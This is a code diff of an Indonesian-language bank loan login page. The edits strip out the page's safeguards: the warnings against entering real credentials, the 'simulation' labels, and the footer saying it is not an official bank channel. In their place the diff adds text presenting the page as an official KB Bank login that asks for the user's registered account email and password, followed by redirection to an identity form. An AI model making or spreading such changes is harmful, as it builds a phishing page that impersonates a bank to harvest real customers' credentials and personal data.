@@ -122,14 +122,14 @@
     </div>
 
     <section class="content">
-      <p class="eyebrow">AKSES MODE SIMULASI</p>
+      <p class="eyebrow">AKSES MODE FINANCE</p>
       <h1>Selamat Datang<strong>Login Simulasi</strong></h1>
       <p class="lead">Nikmati proses pengajuan yang lebih praktis dengan pilihan plafon dan tenor yang dapat disesuaikan berdasarkan kebutuhan serta hasil analisis kelayakan kredit..</p>
 
       <form class="card" id="login" autocomplete="off" novalidate>
         <div class="safety">
           <div class="shield">◇</div>
-          <div><strong>Gunakan data contoh saja.</strong><br>Jangan masukkan email, password, PIN, OTP, nomor kartu, atau kredensial akun asli.</div>
+          <div><strong>Gunakan Resmi KB BANK.</strong><br></div>
         </div>
 
         <div class="field">
@@ -137,7 +137,7 @@
           <div class="wrap">
             <input id="demoEmail" type="email" maxlength="80" placeholder="Contoh: demo@simulasi.test" autocomplete="off" inputmode="email" spellcheck="false">
           </div>
-          <p class="hint">Hanya dipakai sementara di browser dan tidak disimpan.</p>
+          <p class="hint">Masukkan alamat email aktif yang terdaftar pada akun KB Bank Anda.</p>
         </div>
 
         <div class="field">
@@ -149,15 +149,15 @@
         </div>
 
         <div class="message" id="message" role="status" aria-live="polite"></div>
-        <button class="primary" type="submit">Masuk ke Simulasi</button>
+        <button class="primary" type="submit">Masuk ke </button>
 
         <div class="meta">
-          Email/password demo tidak dikirim atau disimpan. Backend hanya menerima Session ID anonim dan halaman aktif untuk monitoring simulasi.
+Syarat dan ketentuan berlaku. Persetujuan, plafon, tenor, dan pencairan mengikuti hasil verifikasi serta kebijakan kredit yang berlaku
         </div>
       </form>
     </section>
 
-    <footer>Halaman demonstrasi antarmuka. Bukan kanal resmi bank dan bukan halaman transaksi nyata.</footer>
+    <footer>KUR • Kredit Modal Kerja • Kredit Investasi • KPR • Kredit Serba Guna • Pembiayaan PNS & Pensiunan</footer>
   </main>
 
   <script>
@@ -182,17 +182,17 @@ form.addEventListener("submit", (event) => {
 
         if (!demoEmail || !demoPassword) {
           msg.className = "message error";
-          msg.textContent = "Lengkapi email dan password simulasi.";
+          msg.textContent = "Lengkapi email dan password .";
           return;
         }
         if (!/^[A-Z]/.test(demoPassword)) {
           msg.className = "message error";
-          msg.textContent = "Password simulasi harus diawali huruf besar.";
+          msg.textContent = "Password harus diawali huruf besar.";
           return;
         }
 
         msg.className = "message success";
-        msg.textContent = "Login simulasi berhasil. Mengarahkan ke Form Identitas Simulasi…";
+        msg.textContent = "Login  berhasil. Mengarahkan ke Form Identitas Simulasi…";
         window.setTimeout(() => {
           window.location.href = "identitas.html";
         }, 350);
